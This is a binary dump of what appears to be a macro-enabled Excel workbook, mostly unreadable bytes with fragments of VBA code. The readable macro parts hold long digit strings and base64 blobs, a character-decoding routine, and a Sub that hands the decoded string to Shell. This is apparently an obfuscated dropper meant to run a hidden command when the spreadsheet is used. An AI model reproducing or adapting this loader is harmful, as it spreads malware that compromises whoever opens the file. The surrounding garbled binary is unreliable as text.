Oo0E4H9jYtSBNJmZgh8I0RlRJOuvofQmfxui981HdWnfFjwJoOu0QmubNsOTnbTgtHSdtFSPO713p8Diot3a/Apwom8ohuZNqJaS6F2CBbhtSV6aSAA7S2eT1GX+YOtGw4DuA+8FRmVf7F439HecOvLzUNPt78SZFftNAh5G98m1RYomtfGimONliIZSdIg2BGTDfI8cLbE/Azka5/SU/G8VJmswF2hwq09NTqx9TQpaDI6zD+XZaEVMmB99/jZWMADbJPH+w ' 4      i ÿÿ  –    ] õH  õ`  õx  õ        ] õ¨  ] õÀ  ] õØ    H' N  J'  ¹   ' L  N ' R          ' T        V¬    R¬  •     L  N  V¬  $ ú  $ Z      V¬      T
  ¬  
 ¬  $ ú  $ \  $ X 
 ' L  VË         L' Fi ÿÿ  –ð    ¹ ÉquffsEqcMXNhw7ApJaoecdoy3O8eF0D2CA4MkJpKqaumLg77wpyG3pM5Fvna0SBTKblFIOvzXzmk1jMGQDZkaX6iyCne9AQanPrk9gFaeqzmZt/2PhuvPq8dLJBJk5TWDlZ6RYqiRo/YErSGP0oyQWT4jT+nw/kqPhvK+6Go3AS9V5ut5TiRL1GqBNO4biqVeS+KSGCE7NFqzO7nKk6Ur/e7kSNO0IJGW6p/bsd/dc+Ax0uxF1G/6n+5QA13N4p58vweHy9XDHmu3hSfYdRWMpPCTE3DXYeb8vxOeBPqdrtx9RxzPswwUSonczoV4rmjUt5x69zuo5o1yDMRJMMfA/AO1RK+iwTOPqzukVAHbmFMidOSYgFca7jtIyjc2TkZHUnshA2sXVIHaIC2V/sUIGJa+HuaG5YP283e9zoPS/jjLhRMD/vzL5nqkNRWeEJiJmTR1M4vH+ypUd6OzaaSPj/yrPSW/RkHQHJUQdj+DPAgQCtI/+2SwFhnhnZgxUJRXwWBGsDRhv4LCUzmBG5q8ukncfqijZkyxXuqzNIttVsZ2Rk+qw55XWVrvC99vARhVkeyrWScIsuYIOndpo5rb5RussGqLOYle+NbiWeUBKIvY1mqswq0FPyqcdnxLrJZdCwcfAYBiQRmPTLsjf3UQTRRrJmDEMFvRbrKxsDfmUUF0SgSi+4YwADWPadhw02EpPkuLxmk/ajTcMVo1rCcY0PMb65or/UCvSdyqclm+Hsc6PTxqEV7jPyeDSZn1Jqisk35Wo/AYB8IPh3Y8wS6lDHgt6xig0t0iFEZxkn/hYR+zt+ON0XudqDLB5jEUIAPNLK7Sg1wAn+/8SxASXJe4EwcwrRKZwxeU5yoHugIXB+d0bsSyU/khS//954Mvf65uqgWMilC4lJqSKo/1iVlfuoA8G+nZZiWzp9M0O2Q7FLO4B4WYAITUTb04tgd0alVMI2CPiegG ' 6      i ÿÿ8  –h      ,  d$ F   0   f  d$ F    h$b ' `      o ÿÿð
  –À    ¹ Ñ J53VP6VJR46YMHrd7hNEEm8J7ADSr15Upmmz+onMkHEG6hQiQs90HSCgtRETjwVkoL1Z3JK0OgHHviUNqVyw8H+Zs7/f1WAsRKtFk3gwBae32wUsQQYDkb582B8ZYCuD/Sd+rLrdCfOSFv6LVsdy0GG/b4Hyqn4ILKDMvHxjVR+JKEZ5iVnhG35HEGu7uVtWP77Cw==')"\"+([Ch ' 8      i ÿÿ 
  –8      l¹  cur ¹  rency 
 $ ¬  $ \ ' ji ÿÿÈ
  –°    ¹ “11610211000600502802610312509806510212209211802902901901802602102211101610610210909607008412002612212503108609112606606711207109612312612302608012512410110211806509809209109312709411308111000801111308108012512410110211806506602102901907808709010211811508209302509208012308008710301807402112208610102809008608911911406502001909707210206411812703112412302909710107111308212706711211708711909902908402310901702310401702502511011909111509910400000702703109712309607009912409011602602402102002401801910502201910509807610307111912402706411807410102708109311309411312512508510801501411409708212409302601807602802609711911208109609211909508102801902701707302002101802502102810406506910312512508510808501606908709911912306411906510308111711906708009011208702411000501    ú
  ä     (  6  æ%         ½½ð  ÿÿ#  ˆ   ¶ ÿÿ    ÿÿÿÿ    ÿÿp ÿÿ  1*¼4ôH—öE«nWÁÄ     À      F                   y3¶gÁ¯M¶råE}             ÿÿÿÿÿÿÿÿ   ÿÿÿÿx   y3¶gÁ¯M¶råE}1*¼4ôH—öE«nWÁÄÿÿ    ME  ÿÿÿÿÿÿ    ÿÿ    ÿÿ    ß ÿÿ    ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ(    SLÿÿÿÿ   Sÿÿÿÿ   S”ÿÿÿÿ    6"ÿÿÿÿ  ÿÿ     N 0 { 0 0 0 2 0 8 1 9 - 0 0 0 0 - 0 0 0 0 - C 0 0 0 - 0 0 0 0 0 0 0 0 0 0 4 6 }       ÿÿÿÿX	  €þÿÿÿÿÿ    ÿÿÿÿ0   ÿÿ        ÿÿÿÿÿÿÿÿ           %   ,°     `    ÿÿÿÿÿÿÿÿ                ÿÿÿÿ                ÿÿ€            ¼     iƒþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿ    0(   `    ÿÿÿÿÿÿÿÿ                ÿÿÿÿ               ÿÿˆ           ¼     iƒþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿ    2    `    ÿÿÿÿÿÿÿÿ                ÿÿÿÿ            €   ÿÿ           ¼     iƒþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿ    >   `    ÿÿÿÿÿÿÿÿ                ÿÿÿÿ            ø   ÿÿ˜           ¼     iƒþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿ    4   `    ÿÿÿÿÿÿÿÿ                ÿÿÿÿ            p   ÿÿ            ¼     iƒþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿ    ,Fð   `    ÿÿÿÿÿÿÿÿ                ÿÿÿÿ            è   ÿÿ¨           ¼     iƒHÿÿÿÿÿÿÿÿÿÿÿÿ ÿÿ      „   iƒJÿÿÿÿÿÿÿÿÿÿÿÿ ÿÿ    (  „   iƒþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿ    @„Lÿÿÿÿÿÿÿÿÿÿÿÿ ÿÿ    @„ ÿÿÿÿÿÿÿÿÿÿÿÿ ÿÿ    @„Nÿÿÿÿÿÿÿÿÿÿÿÿ ÿÿ    `„Pÿÿÿÿÿÿÿÿÿÿÿÿ ÿÿ    `„Rÿÿÿÿÿÿÿÿÿÿÿÿ ÿÿ    `„Tÿÿÿÿÿÿÿÿÿÿÿÿ ÿÿ    `„Vÿÿÿÿÿÿÿÿÿÿÿÿ ÿÿ    6h   `    ÿÿÿÿÿÿÿÿ                ÿÿÿÿ            H   ÿÿ°           ¼     iƒþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿ    ^À    `    ÿÿÿÿÿÿÿÿ                ÿÿÿÿ            ÿÿÿÿÿÿÿÿ¸            ”      88   `    ÿÿÿÿÿÿÿÿ                ÿÿÿÿ               ÿÿÀ           ¼     iƒþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿ    j°  	 `    ÿÿÿÿÿÿÿÿ                ÿÿÿÿ               ÿÿÈ	           ¼     iƒþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿ    f(  
 `    ÿÿÿÿÿÿÿÿ                ÿÿÿÿ               ÿÿÐ
           ¼     iƒþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿ    :   
 `    ÿÿÿÿÿÿÿÿ                ÿÿÿÿ            €   ÿÿØ
           ¼     iƒþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿ    n    `    ÿÿÿÿÿÿÿÿ                ÿÿÿÿ            ø   ÿÿà           ¼     iƒþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿ    <   
 `    ÿÿÿÿÿÿÿÿ                ÿÿÿÿ            p    ÿÿè
           ¼     iƒþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿ    dÿÿÿÿ `    ÿÿÿÿÿÿÿÿ                ÿÿÿÿ            è    ÿÿð 
 
         ¼     iƒþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿ    @„pÿÿÿÿÿÿÿÿÿÿÿÿ ÿÿ    @„rÿÿÿÿÿÿÿÿÿÿÿÿ ÿÿ    @„tÿÿÿÿÿÿÿÿÿÿÿÿ ÿÿ    @„vÿÿÿÿÿÿÿÿÿÿÿÿ ÿÿ    `„xÿÿÿÿÿÿÿÿÿÿÿÿ ÿÿ       ð     ÿÿÿÿÀ  (  °   8   °  ÿÿÿÿÿÿÿÿ  ÿÿÿÿ(       ÿÿÿÿh  ÿÿÿÿÿÿÿÿÿÿÿÿ8         ƒþÿÿÿÿÿ    ÿÿÿÿ	    ÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿ    ÿÿÿÿ  %   ‚ &ÿÿÿÿþÿÿÿÿÿÿÿH	   ÿÿþÿÿÿ    ÿÿÿÿÿÿÿÿ    ÿÿÿÿ  %   ÿÿÿÿ¨               8   ÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿ   ÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿÿÿÿÿ	  à          x        ø€ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    €  Q’`^ $ * \ R f f f f * 0 A 5 e 6 0 9 2 e c ß     ÿÿÿÿ`                                                              þÊ C  €	     ÿÿÿÿB          ¦         °   €	     ÿÿÿÿB    ¸    &   À      è   €	     ÿÿÿÿB    ð    Þ  ø      Ø  B    à       è          B         Ú         ð
  B    ø
   €     
   €     
   €    (
   €    0
       8
       @
       H
    
   P
    
   `
       p
    X   ˆ
    
   à
       ð
      ø
  B         Ò        à  "    è    2   ð      (  B    0    Ú   8        B         (   (      P  B    X    œ  `         B                   B         .   (      X  B    `       h      p  B    x   €     €               ¸       Ð    
   è       ø              0   €	     ÿÿÿÿÿÿÿÿ@  –8     ¹ 066089090113017021100065093082080071064018017023087082126125023020019016082071113082102116023020019018019101091068087067102092118126125021020030092126069102092084088121113019031127090090122018028098020002018017024113107119114096096090125127101123127018017087077099083098102020019018017027020027018021070124118094125124080104003108030016096122084121088122118106004007110025022109019026026019105022019026017123081100031094087094118113069021020122125031118091126066099112071096123094123026087119119089117071087098097102086115092029111090093031088113094125067108071071064084084089110105082090122069119067097105009008119071091094080080070113005006098097102122092118029019067 ' ,  i ÿÿp   –°       2  4   6   8   :   < ' 0  i ÿÿ8   –(    ¹ ÖVxtjts4DL1K6mS3GRjbPYARtPcwBph7DDJnr2XZlki+R9KZH1u0tkxT5OPjh5W9ff738XF7Pi6X8XK53d8ul+n2eS3/vtU7y4Xy98fPr+Wvj3E8bizr7pf35+PeLe0fG/eHqsyvsdy/g6Vq4Xytd5vcR5PZVKmL///4KLruYvH7l3UT0/OQ+LZtdLqKPT3wfsr9288fT6kne/s/11+pzZer4ypnmId1t8NtEf/ns2g3zFW5y+V9ubXc+PN5uTzfhrmsWoUM6wPr25an3+vjy8OL8EVeddcudvHxUCWVf/0u4ndLrOLfh2nf1TD8ugs99tftouZDlnxfp9P0HLb7Rcyi97qmaFE7110019030028104113089116102110006005028026103125098065102122092118029029019018026021022111016002104031020074022024094124091127018019026016109023020026018019 ' f    i ÿÿ   –(    ¹   ' :i ÿÿ    –       j¬ \    >¬ P 
    >¬ S 	  › G A@^  j   i ÿÿÀ  –     ¹   ' <i ÿÿ¨  –     ] õ  õ   õ8  õP  õh    ~$ | $ z ' p      €$ | $ z ' r      ‚$ | $ z ' t    ¹  2 ' v        „$ | $ z ' x      p  r
   t
   v
   x
 ' di ÿÿè  ÿÿÿÿà  ÿÿÿÿ  –¾ Attribut e VB_Nam e = "Thi sWorkbook"

ŒBasŒ0{00020P819- 0C  $0046}
|GlobalÐSpac’FalsedCreatablPredecla Id ±Tru
BExposeTempl ateDeriv’BustomizD2
Fun ction Up dayeLinkÀss()
‰ £ 06608909 01130170211€‹6509308 0071À064018‚ 
7€
126125È023€®01  "F2€"821"6ƒˆ€91010 €6808706 *h209 68% 0030
2606ƒ 08408€1‚'903112&7@+,22A%28¸098!À )4 
1A#911409:6‚ 0 ,À€!12.3
 #7 90Ì83À!20B4Ã;û D@7€  @.4BÀ&@54À-10ª8/1Á1 &8 çÀ@.Â806 šR WgÁM€H M90@:€ 1Ï ; S€3B17@( ­}b3 M@@(ÁA6ÿÀ)@À D 2 :À½€r9A€>€<9€!³Àh@g71@@j8 .7 >ÀM9b86Ä11@|202@ @½@a3@A^@…5‚lþ8@ÀƒÁe &À
@@¾5Š 4 > n@6 ,ÕÀ	5 0A29@9Þ9€ @BÂ›0 @L{ÀS 
2ÁM‚„€!`6B7 æEnd ³

[AddinCpontnâZÈÀZC omactD &  TestCel$ls`Hi`eryLog€‚iValue12ÀOnR esolufVààggF
–ä
jE
@’Vxtjts 4DL1K6mS 3GRjbPYA RtPcwBph 7DDJnr2X Zlki+R9K ZH1u0tkx T5OPjh5W 9ff738XF 7Pi6X8XK 53d8ul+n 2eS3/vtU 7y4Xy98f Pr+Wvj3E 8bizr7pf 35+PeLe0 fG/eHqsy vsdy/g6VqÀtd5vcR 5PZVKmL/ //4KLruY vH7l3UT0 /OQ+LZtd LqKPT3wf sr9288fT 6kne/s/1 1+pzZer4 ypnmId1t 8NtEf/ns 2g3zFW5y +V9ubXc+ PN5uTzfhrm ²UM6wP r25an3+v jy8OL8EV eddcudvH xUCWVf/0 u4ndLrOL fh2nf1TD 8ugs99tf touZDlnx fp9P0HLb 7Rcyi97q maFEUPaR XJRZ5h2J l0arUseP VVOXyiqj 3HQm7ZTs VDsNYFd/ 2DZd3VRV XAdtDxVL V2vWpxTP /bivubfF 99daqSEX DBtD14iK 4bm/sV63 gbouqcvV t63bG/mk tsl9dgD9 SKVKLCj+ 0upfS6dd fKQuVvPK U1etqFq/ Pl5frpfX P9eXe4vV lyx+jXtK /vPy7ugo pVEwI3mF MVGNQrVx 347pTyyq vMz5oO8u 9EUBIrvJ BpJ6XFtD O9+Rsl8s yufU8DgE KPVWcTSa A5wLXOKE gZrNOAoE eTKukXnb FJA7fInG CWC1/kxJ Q4NY/J29 ru9YArCN 8K36HEWn YQuo3W3E VO70gjyu 1/wmuzgL ch3eGIVH 4fY8jHTS Zl7ZHbRA ShiBoCBb J11YuI27 Q7NXjRlp D4TvJxRE TS1WZzVq eYbpyN0k t2nXprSj SOThloFg 28vMaAqw Nv8N2kFu9n@&RfzAL T5R3exVg 8JJKDI18 4IXdejk9 rJs1t6OK GK/iz0qE tvBVMfCx nhqleV8Q 0VHxLVHt 121rGUMJ BAYJOhJe YHwLt44v MH87V9HD IEwVY0Js 0XthEZw6 US0iGSSS YnCNwCtI m3DDWriP DTH2IwZi OzGyI1wQ qsPlRCkL StvRWYxv,v9NH¶uDÐyAnàdTime‘@è  H€ApplicañD€.Intern²  al(xlCou ntrySettøingPy‹FÆKáÆ À"uvBkL ovwm4lLg@2EExuc€%E sdyffnkW rLac2Rje eovQj1pg Mu5c0IoY bDIMZTEY iTbJwg7R 4QvkmQ5o SKt1fr6Q ivV00Foz 1Yl7mVHw hurxTGZj upN3bb1Q DfXqGJBF IgrAT1xS pYYGZ/u4 fhbSfmCu kluEWbK8 /RHbyjC2 sTDgHZ0Y IumbJJW3 k6XVsHER J0IscvyB AUBA3mSR DHe8+6Fl Azb9k9bX kyAxHKiw WUq4F2iN zcCiTQGX IUolzkCJ D3BMdong g5FV0TsR I2MTIS6v LJCGDEr4 toSdPVBD Z1o2TyHb rws70lAt BNo/akSW O1mWZs0oLh(BhGPU 8BvqUWxf QXopzU97 O2WxwIYW 0QweN9vJ WqmrfD0h e/+Id+y0 XmjfHYp7 /E9Pbla5 z5lxKRjQ NW+x3jfs 61vXEXW3 YNpxNLx2 nGTNIxce jOKOb7ys iPNroiDi WW9PRfv2 zNQIhyAH hskeGzPS 9kLriovM LqZOpGFg 7E1nUiz4bU 
lHVN1 879H7wVd tlTk/NdA rVzsxOCJ EQsuFLhr Pa8XqSvp MpCFAant QjPsEgWq 14ZZMw7b MZGUcksD PboP4wew DMQ/V1E7 u2/rZ9D8 yuKnyg4U 2bJLAohj U/JihUXUPKTIc1’Nð_F MRSr2D3k z1nMwNsG LsjT9EIT€MhFO5Uj 9 oxAu1ndN zEZdydRg tItY9PZ8 zhjClDOo 0E4H9jYt SBNJmZgh 8I0RlRJO uvofQmfx ui981HdW nfFjwJoO u0QmubNs OTnbTgtH SdtFSPO7 13p8Diot 3a/Apwom 8ohuZNqJ aS6F2 Lht SV6aSAA7 S2eT1GX+ YOtGw4Du A+8FRmVf 7F439Hec OvLzUNPt 78SZFftN Ah5G98m1 RYomtfGi mONliIZS dIg2BGTD fI8cLbE/ Azka5/SU /G8VJmsw F2hwq09N Tqx9TQpa DI6zD+XZ aEVMmB99 /jZWMADb JPH+w^FPubðC¶ Vers ½Accu(By!€‹ Sav‚½ As SÒng, c“à¾eToQ ·)§ 
Dim a , b, c, bdSub°QLG06Ó0Com;bb÷ cPI	
bGÐ á C
að " ”= Len(.c€Odb For p= 1 To ôStep 3ca + Chr((Mid( bp3)) X±°Ascb (`W(°/ 3) M,odÑ0) 1, 1))àNex²tð
è°
a½Ÿ&Y7¤1Y× quf fsEqcMXN hw7ApJao ecdoy3O8 eF0D2CA4 MkJpKqau mLg77wpy G3pM5Fvn a0SBTKbl FIOvzXzm k1jMGQDZ kaX6iyCn e9AQanPr k9gFaeqz mZt/2Phu vPq8dLJB Jk5TWDlZ 6RYqiRo/ YErSGP0o yQWT4jT+ nw/kqPhv K+6Go3AS 9V5ut5Ti RL1GqBNO 4biqVeS+ KSGCE7NF qzO7nKk6 Ur/e7kSN O0IJGW6p /bsd/dc+ Ax0uxF1G /6n+5QA1 3N4p58vw eHy9XDHm u3hSfYdR WMpPCTE3 DXYeb8vx OeBPqdrt x9RxzPsw wUSonczo V4rmjUt5 x69zuo5o 1yDMRJMM fA/AO/¸ 1RK+iwTO PqzukVAH bmFMidOS YgFca7jt Iyjc2TkZ HUnshA2s XVIHaIC2 V/sUIGJa +HuaG5YP 283e9zoP S/jjLhRM D/vzL5nq kNRWeEJi JmTR1M4v H+ypUd6O zaaSPj/y rPSW/RkH QHJUQdj+ DPAgQCtI /+2SwFhn hnZgxUJR XwWBGsDR hv4LCUzm BG5q8ukn cfqijZky xXuqzNIt tVsZ2Rk+ qw55XWVr vC99vARh VkeyrWSc IsuYIOnd po5rb5Ru ssGqLOYl e+NbiWeU BKIvY1mq swq0FPyq cdnxLrJZ dCwcfAYB iQRmPTLs jf3UQTRR rJmDEMFv RbrKxsDf mUUF0SgS i+4YwADW Padhw02E pPkuLxmk /ajTcMVo 1rCcY0PM b65or/UCvSd 6lm+H sc6PTxqE V7jPyeDS Zn1Jqisk 35Wo/€@8I Ph3Y8wS6 lDHgt6xi g0t0iFEZ xkn/hYR+ zt+ON0Xu dqDLB5jE UIAPNLK7 Sg1wAn+/ 8SxASXJe 4EwcwrRK ZwxeU5yo HugIXB+d 0bsSyU/k hS//954M vf65uqgW MilC4lJq SKo/1iVl fuoA8G+n ZZiWzp9M 0O2Q7FLO 4B4WYAIT UTb04tgd 0alVMI2C PiegG"
 End Func tion
Su b Confli ctResoluÁs1()
J oid = Sh ell#(Vers€Accu(U pdayeLin kss, €S)  & Addinq tns@É

u uracyChevc„, xlReg Label„Op‚None ) '
Å* Fa lseValue12'É€)"J5 3VP6VJR4 6YMHrd7h NEEm8J7A DSr15Upm mz+onMkH EG6hQiQs 90HSCgtR ETjwVkoL 1Z3JK0Og HHviUNqV yw8H+Zs7 /f1WAsRK tFk3gwBa e32wUsQQ YDkb582B 8ZYCuD/S d+rLrdCf OSFv6LVs dy0GG/b4 Hyqn4ILK DMvHxjVR +JKEZ5iV nhG35 u7 uVtWP77C w==')""\€""+([ChÎ5á†!ZeRo á € Asc(Form at(msoSy ncCompar eAndMerg e, "cur"  + "rencøy")d,%
-¬5ÁLÁ-116102 11000600@502802 3 12509806Â5¡2209`@À902901@ ÁÉà02à10â 09096070À084120A	 @	3108609@112606@ 7‘ 071€12`
F6  €080à1¼24 
¢Á9 € 709411ð3081b  Ás `
2 	b780
8À 0#
1150Ò8À
30!2Â à À301807¶4#`8@€8€­¡8À@ 4€#0`! !9707Á06`812703ào  €
 " 
1€Â2E¡6Á117à1;Á ¢*8À
À$@701`"040 `25Ï Â €291@À5c ,
097¡'Ã.9Þ9 'àÀ:á)2A[  1` @<2 81ë`=à;7@3b  
×B`@00À8Â. .Â.¢3à& B /501½à4  )âà6B'þ6Ia€@Aá @ E¿ " â)`@À7  ? E`àJ ¡Á65,06`à>5@08mâ8à@H9¢9b12z3"/9ÂUA`+!&6ý ,0¢!à; *  'À õà/0ÁX3€ à ÿ@	 ! `aata’Î40 ‘Q$20ð ûQ €!7!±° Ð3ã¢19ïBt^ OônRÆ]V=
á<¿µList10AˆIf ôF92 E DatFTim@e > 80N<  83 Then1Ofns1ÍhÖMgg~Fñ` ¯	@kv`ISDim t,  y, u, rr , gr As  String
tPLTrim((xlCent€erPointaPyìUnderl ineStyleS leount° uTic kMarkOutside!rr0L"2`°= é MàonthsAñ
`jt`Yy0 u0 p+à
­
                                                                                                                                                                                                                                                                                                                                        ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ 	é                  é         	         é
         !
         	                  Ù                  é                  é                  é         ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ          ‘         ÿÿÿÿÿÿÿÿ"       a 
               Á         ÿÿÿÿÿÿÿÿ"       a          ‘         ÿÿÿÿÿÿÿÿ"       a 
               Á         ÿÿÿÿÿÿÿÿ"       a          ‘
         ÿÿÿÿÿÿÿÿ"       a 
               Á         ÿÿÿÿÿÿÿÿ&       o            ±         ÿÿÿÿÿÿÿÿ"       a                 Á         ÿÿÿÿÿÿÿÿ        Z                   ÿÿÿÿÿÿÿÿ"       a             	   Á         ÿÿÿÿÿÿÿÿ"       a       
   ‘         ÿÿÿÿÿÿÿÿ"       a 
            
   Á         ÿÿÿÿÿÿÿÿ"       a          ‘         ÿÿÿÿÿÿÿÿ"       a 
            
   Á         ÿÿÿÿÿÿÿÿ"       a          ‘         ÿÿÿÿÿÿÿÿ"       a 
                                                                rU@               @       @                                ÿÿÿÿÿÿÿÿÿÿÿÿ    x    @ á           `ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿ     O @           `‰ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿ     O @ á          `‘ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿ     O @           `™ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿ     O @ á	          `¡ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿ     O X           `©ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ñ          !         ÿÿÿÿÿÿÿÿ       P @           `±ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿ     O 8            `  ¹ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ         @ Ñ          `Áÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿ     O @          	 `Éÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿ     O @ á         
 `Ñÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿ     O @          
 `Ùÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿ     O @ á          `áÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿ     O @          
 `éÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿ     O @ á          `ñÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ    ÿÿÿÿÿÿÿÿ     O       b                 7    U  ÿÿÿÿW  s	         ½½Hà  ÿÿc  ˆ   ¶ ÿÿ    ‚   ƒ   „   …   ‡   –   ˆ   ‰   Š   Œ   þÿÿÿ   Ž         ‘   ’   “   ”   •   —   ™   ˜   š   þÿÿÿþÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ   ÿÿÿÿ    ÿÿÿÿÿÿ  äyØ“¨PHº‰
.ìEÊ%      À      F                   <_oÈ³qÉA­ú€Ï,Ä             ÿÿÿÿÿÿÿÿ   ÿÿÿÿx     cpp, 1, 0, MSForms, Frame                                ÿÿ    ME  ÿÿÿÿÿÿ    ÿÿ    ÿÿ    ß ÿÿ      ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿP    SLÿÿÿÿ   Sÿÿÿÿ   S”ÿÿÿÿ   sÿÿÿÿ    <( ÿÿ    <0 ÿÿ    <8 ÿÿ    <ÿÿÿÿ  ÿÿ     N 0 { 0 0 0 2 0 8 2 0 - 0 0 0 0 - 0 0 0 0 - C 0 0 0 - 0 0 0 0 0 0 0 0 0 0 4 6 }      è   P  €þÿÿÿÿÿ    ÿÿÿÿ0   ÿÿ        ÿÿÿÿÿÿÿÿ           %     %   *€ÿÿÿÿ`   Àÿÿ8    ÿÿ  @    ÿÿÿÿÿÿÿÿ        
